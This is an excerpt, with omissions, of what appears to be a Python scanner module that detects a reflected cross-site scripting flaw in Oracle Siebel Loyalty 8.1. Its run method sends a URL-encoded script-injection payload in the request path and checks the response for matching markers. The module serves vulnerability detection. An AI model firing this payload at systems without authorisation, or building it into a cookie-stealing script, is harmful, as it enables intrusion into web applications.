#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascrip."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Siebel Loyalty 8.1 - Cross-Site Scripting Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'oracle', 'siebel', 'packetstorm', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Oracle Siebel Loyalty 8.1 - Cross-Site Scripting detected",
